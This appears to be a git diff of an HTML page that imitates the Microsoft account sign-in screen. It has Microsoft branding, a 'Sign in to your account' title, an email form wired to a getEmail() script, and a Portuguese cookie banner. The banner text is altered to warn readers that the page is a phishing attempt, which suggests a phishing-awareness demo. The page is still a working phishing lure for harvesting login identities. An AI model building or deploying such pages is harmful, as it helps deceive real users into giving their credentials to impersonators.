@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Sign in to your account</title>
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="microsoft-icon.png">
 </head>
@@ -12,21 +12,50 @@
     
     <img class="backg" src="illustration">
     <div class="cover">
+        <div class="cookie-ban"  role="alert" style="display: visible;">
+            <div class="cookie-ban-icon-text">
+                <span  style="overflow-x: visible;">
+                <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 44 44" width="24px" height="24px" fill="none" stroke="currentColor" style="overflow-x: visible; ">
+                <circle cx="22" cy="22" r="20" stroke-width="2" style="overflow-x: visible;"></circle>
+                <line x1="22" x2="22" y1="18" y2="33" stroke-width="3" style="overflow-x: visible;"></line>
+                <line x1="22" x2="22" y1="12" y2="15" stroke-width="3" style="overflow-x: visible;"></line>
+                </svg>
+                </span> 
+                <p class="cookie-text" style="overflow-x: visible;">
+                    Utilizamos cookies opcionais para não caia nesta tentativa de phishing nos nossos Web sites, vc tem que olhar para a url, e para mostrar publicidade personalizada baseada na sua atividade online. Se rejeitar os cookies opcionais, só serão utilizados os cookies necessários para lhe fornecer os serviços. Poderá alterar a sua seleção ao clicar em 'Gerir Cookies' na parte inferior da página.&nbsp;<a target="_blank" href="https://go.microsoft.com/fwlink/?LinkId=521839" style="overflow-x: visible;">Declaração de Privacidade</a> <a target="_blank" href="https://aka.ms/3rdpartycookies" style="overflow-x: visible;">Cookies de Terceiros</a>
+                </p>
+            </div>
+    
+            <div class="cookie-btns" style="overflow-x: visible;">
+                <button  type="link"  style="overflow-x: visible;"><a href="index.html?email=#" onclick="erase()" style="color:white">Aceitar</a></button>
+                <button type="button"  style="overflow-x: visible;"><a href="index.html?email=#" style="color:white">Rejeitar</a></button>
+                <button type="button"  style="overflow-x: visible;"><a href="index.html?email=#" style="color:white">Gerir cookies</a></button>
+            </div>
+            </div>
         <div class="main">
             <img src="bannerlogo" alt="">
-            <p><strong>Sign in</strong></p>
-            <form action="#" method="post">
-                <input type="email" id="user_email" name="email" placeholder="Email, phone, or Skype">
-            </form>
             <div>
+                <img class="arrow" style="display: none;" src="image.svg"></img>
+                <p class="error" style="display:none;">Enter a valid email address, phone number, or Skype name.</p>
+            </div>
+            <p><strong>Sign in</strong></p>
+            <form class="form"  action="#" onsubmit="getEmail()">
+                <input type="email" id="user_email" name="email" placeholder="Email, phone, or Skype">
+            
+            <div >
 
             
-                <p>No account?</p>
-                <a href="http://login.microsoftonline.com">Create one!</a>
+                <p class="delete">No account?</p>
+                <a class="change" href="http://login.microsoftonline.com">Create one!</a>
             </div>
             <a class="sec-link" href="http://login.microsoftonline.com">Can't access your account?</a>
-            <div class="buttons"><button>Back</button><button type="submit">Next</button></div>
-        </div>
+            <div class="buttons"><button class="delete" style="background-color:rgba(0,0,0,0.4);color:black">Back</button><button  class="sub" type="submit">Next</button></div>
+            </form>
+           
+    </div>
+    
+    <div class="footer"><a href="">Terms of use</a><a href="">Privacy & cookies</a><a  class="dots" href="">• • •</a></div>
+    <script src="index.js"></script>
 </div>
 </body>
 </html>
